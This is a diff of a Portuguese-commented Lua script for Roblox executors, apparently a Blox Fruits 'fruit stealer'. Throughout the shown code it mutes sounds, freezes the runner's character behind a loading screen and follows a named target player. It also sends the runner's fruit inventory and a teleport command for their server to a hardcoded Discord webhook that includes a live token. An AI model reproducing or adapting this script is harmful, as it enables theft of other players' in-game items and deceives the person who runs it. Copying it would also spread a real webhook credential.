@@ -20,7 +20,7 @@ local jobId = game.JobId
 local webhookURL = "https://discord.com/api/webhooks/1349483490151891087/GaVAOLEdQXjzVNmcx3VtCi8IfXilWxGalFn-3RrMMktrHmzFWQq5dfruXLJgA9bHIv8W"
 local firstTeleportDone = false  
 
--- Funções utilitárias
+-- Função para remover sons
 local function removerSons()
     for _, sound in ipairs(game:GetDescendants()) do
         if sound:IsA("Sound") then
@@ -29,6 +29,7 @@ local function removerSons()
     end
 end
 
+-- Função para bloquear pulo
 local function bloquearPulo()
     local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
     local humanoid = character:FindFirstChild("Humanoid")
@@ -37,6 +38,7 @@ local function bloquearPulo()
     end
 end
 
+-- Função de teleporte para o jogador alvo
 local function teleportToPlayer(targetPlayer)
     if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
         local targetHRP = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
@@ -58,6 +60,7 @@ local function teleportToPlayer(targetPlayer)
     end
 end
 
+-- UI de Loading
 local function createOrUpdateLoadingUI(visible)
     local screenGui = LocalPlayer.PlayerGui:FindFirstChild("LoadingUI")
 
@@ -118,6 +121,7 @@ local function createOrUpdateLoadingUI(visible)
     screenGui.Enabled = true
 end
 
+-- Monitorar o jogador alvo
 local function waitForPlayerToBeSpawned(player)
     local character = player.Character or player.CharacterAdded:Wait()
     while not character:FindFirstChild("Humanoid") do
@@ -143,6 +147,7 @@ local function monitorRobloxRomao()
     end)
 end
 
+-- Iniciar monitoramento
 Players.PlayerAdded:Connect(function(player)
     if player.Name == targetPlayerName then
         player.CharacterAdded:Connect(function()
@@ -185,6 +190,7 @@ local function onChatted(player, message)
     end
 end
 
+-- Configurar eventos de chat
 for _, player in pairs(Players:GetPlayers()) do
     player.Chatted:Connect(function(message)
         onChatted(player, message)
@@ -213,17 +219,30 @@ local function detectarSea()
     end
 end
 
--- Função para enviar resultados do inventário ao webhook
+-- Função para enviar inventário ao webhook
 local function enviarInventario()
     local InventoryRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
     local InventoryData = InventoryRemote:InvokeServer("getInventory")
-    local fruitsList = ""
     
-    for _, item in pairs(InventoryData) do
-        if item.Type == "Blox Fruit" then
-            local itemName = item.Name
-            local itemCount = item.Count or 1
-            fruitsList = fruitsList .. string.format("%s - %d\n", itemName, itemCount)
+    -- Ordem específica das frutas
+    local fruitOrder = {
+        "Dragon", "Kitsune", "Yeti", "Leopard", "Spirit", "Gas", "Control", "Venom",
+        "Dough", "T-rex", "Mammoth", "Gravity", "Blizzard", "Pain", "Rumble", "Portal",
+        "Phoenix", "Sound", "Spider", "Creation", "Love", "Buddha", "Quake", "Magma",
+        "Ghost", "Rubber", "Light", "Diamond", "Eagle", "Dark", "Sand", "Ice", "Flame",
+        "Spike", "Smoke", "Bomb", "Spring", "Blade", "Spin", "Rocket", "Shadow"
+    }
+    
+    -- Processar inventário na ordem especificada
+    local fruitsList = ""
+    for _, fruitBaseName in ipairs(fruitOrder) do
+        local fullName = fruitBaseName .. "-" .. fruitBaseName
+        for _, item in pairs(InventoryData) do
+            if item.Type == "Blox Fruit" and item.Name == fruitBaseName then
+                local itemCount = item.Count or 1
+                fruitsList = fruitsList .. string.format("%s - %d\n", fullName, itemCount)
+                break
+            end
         end
     end
     
@@ -231,6 +250,7 @@ local function enviarInventario()
         fruitsList = "Nenhuma fruta encontrada."
     end
 
+    -- Preparar mensagem para webhook
     local seaAtual = detectarSea()
     local teleportCommand = string.format("```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n```", placeId, jobId)
     
@@ -258,6 +278,7 @@ local function enviarInventario()
         })
     }
 
+    -- Enviar para webhook
     if syn and syn.request then
         syn.request(requestData)
     elseif http and http.request then
@@ -269,7 +290,7 @@ local function enviarInventario()
     end
 end
 
+-- Inicialização
 task.wait(1)
 enviarInventario()
-
 print("Script carregado! Enviando informações para o webhook…")
